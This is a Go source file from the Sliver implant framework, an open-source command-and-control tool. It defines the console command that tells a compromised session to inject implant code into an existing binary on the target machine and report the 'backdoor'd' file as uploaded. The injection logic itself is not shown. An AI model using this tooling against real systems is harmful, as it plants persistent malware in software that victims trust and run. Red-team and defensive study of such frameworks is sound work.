package backdoor

/*
	Sliver Implant Framework
	Copyright (C) 2019  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	"context"
	"fmt"

	"github.com/bishopfox/sliver/client/console"
	"github.com/bishopfox/sliver/protobuf/sliverpb"
	"github.com/desertbit/grumble"
)

// BackdoorCmd - Command to inject implant code into an existing binary
func BackdoorCmd(ctx *grumble.Context, con *console.SliverConsoleClient) {
	session := con.ActiveSession.GetInteractive()
	if session == nil {
		return
	}

	remoteFilePath := ctx.Args.String("remote-file")
	if remoteFilePath == "" {
		con.PrintErrorf("Please provide a remote file path. See `help backdoor` for more info")
		return
	}

	profileName := ctx.Flags.String("profile")

	ctrl := make(chan bool)
	msg := fmt.Sprintf("Backdooring %s ...", remoteFilePath)
	con.SpinUntil(msg, ctrl)
	backdoor, err := con.Rpc.Backdoor(context.Background(), &sliverpb.BackdoorReq{
		FilePath:    remoteFilePath,
		ProfileName: profileName,
		Request:     con.ActiveSession.Request(ctx),
	})
	ctrl <- true
	<-ctrl
	if err != nil {
		con.PrintErrorf("%s\n", err)
		return
	}

	if backdoor.Response != nil && backdoor.Response.Err != "" {
		con.PrintErrorf("%s\n", backdoor.Response.Err)
		return
	}

	con.PrintInfof("Uploaded backdoor'd binary to %s\n", remoteFilePath)
}
